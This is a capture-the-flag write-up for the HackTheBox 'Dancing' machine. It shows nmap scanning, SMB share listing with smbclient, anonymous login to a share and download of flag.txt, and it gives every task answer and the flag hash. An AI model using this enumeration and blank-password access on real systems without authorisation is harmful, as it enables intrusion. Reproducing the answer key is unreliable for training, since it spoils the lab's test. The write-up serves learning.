
# HackTheBox - Dancing

**Platform:** HackTheBox 

**Difficulty:** Very Easy

**⚠️Disclaimer:** This writeup contains direct answers to task questions, step-by-step solutions, and the final flag.

## Pre-Engagement & SMB Basics

Before interacting with the target, we review the fundamentals of the SMB protocol:

**What does the 3-letter acronym SMB stand for?**
> ✅ **Answer:** `Server Message Block`

**What port does SMB use to operate at?**
> ✅ **Answer:** `445`

---

## Enumeration

First, we perform a port scan using `nmap` to identify open ports and the services running on them.

```bash
nmap 10.129.193.48
```
```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-06 19:05 +0200
Nmap scan report for 10.129.193.48
Host is up (0.042s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds
```

**Alternative Enumeration:**
As an alternative to Nmap, a custom Python port scanner (`viper.py`) can be used to quickly identify open ports and services.The tool is available here: https://github.com/Vlone-p/viper
```bash
python viper.py 10.129.193.48 -sV
```
```text
____   ____.__                                                                             
\   \ /   /|__|_____   ___________                                                         
 \   Y   / |  \____ \_/ __ \_  __ \                                                        
  \     /  |  |  |_> >  ___/|  | \/                                                        
   \___/   |__|   __/ \___  >__|                                                           
              |__|        \/       v2.0                                                    

[*] Loaded 1 target(s)
[*] Thread count set to 100

[*] Scanning 65 ports on 1 hosts...

==================================================
SCAN RESULTS
==================================================

Target: 10.129.193.48
PORT       STATE      SERVICE
-----------------------------
135        open MSRPC
139        open NetBIOS
445        open microsoft-ds(SMB)
5985       open Microsoft-HTTPAPI/2.0 (Not Found)

==================================================
Scan completed in 1.05 seconds
```

Based on our scan results, we can answer the following:

**What is the service name for port 445 that came up in our Nmap scan?**
> ✅ **Answer:** `microsoft-ds`

---

## Exploitation

SMB allows systems to share files and printers over a network. We can use `smbclient` to list the available shares on the target machine.

**What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available SMB shares on Dancing?**
> ✅ **Answer:** `-L`

We use the `-L` switch with a blank password to list the shares.

```bash
smbclient -L \\10.129.193.48
```
```text
Password for [WORKGROUP\User]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.193.48 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

**How many shares are there on Dancing?**
> ✅ **Answer:** `4`

Looking at the output, `WorkShares` stands out as a custom share compared to the default administrative ones. We attempt to connect to it with a blank password.

**What is the name of the share we are able to access in the end with a blank password?**
> ✅ **Answer:** `WorkShares`

```bash
smbclient \\\\10.129.193.48\\WorkShares
```
```text
Password for [WORKGROUP\User]:
Try "help" to get a list of possible commands.
smb: \> 
```

We successfully log in! We use the `ls` command to look around and find two user directories: `Amy.J` and `James.P`.

```bash
smb: \> ls
```
```text
  .                                   D        0  Mon Mar 29 10:22:01 2021
  ..                                  D        0  Mon Mar 29 10:22:01 2021
  Amy.J                               D        0  Mon Mar 29 11:08:24 2021
  James.P                             D        0  Thu Jun  3 10:38:03 2021

                5114111 blocks of size 4096. 1733576 blocks available
```

We navigate to `James.P` and find a `flag.txt` file.

```bash
smb: \> cd James.P
smb: \James.P\> ls
```
```text
  .                                   D        0  Thu Jun  3 10:38:03 2021
  ..                                  D        0  Thu Jun  3 10:38:03 2021
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021

                5114111 blocks of size 4096. 1733447 blocks available
```

---

## Flag Retrieval

To read the flag, we need to download it to our local machine.

**What is the command we can use within the SMB shell to download the files we find?**
> ✅ **Answer:** `get`

We use the `get` command to download `flag.txt`.

```bash
smb: \James.P\> get flag.txt
```
```text
getting file \James.P\flag.txt of size 32 as flag.txt (0.2 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```

*(Once downloaded to our local machine, we can read the contents of the file to retrieve the final flag).*

**Submit the flag located on the SMB share.**
> ✅ **Answer:** `5f61c10dffbc77a704d76016a22f1664`
